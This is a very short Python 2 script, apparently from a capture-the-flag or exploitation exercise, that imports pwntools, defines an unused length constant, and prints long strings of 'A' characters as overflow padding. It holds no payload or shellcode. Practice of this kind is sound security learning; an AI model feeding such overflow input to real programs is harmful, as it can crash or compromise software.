from pwn import *

lenmax = 0xc7d1fb00
print "A" * 126 + "\n" + "A"*120
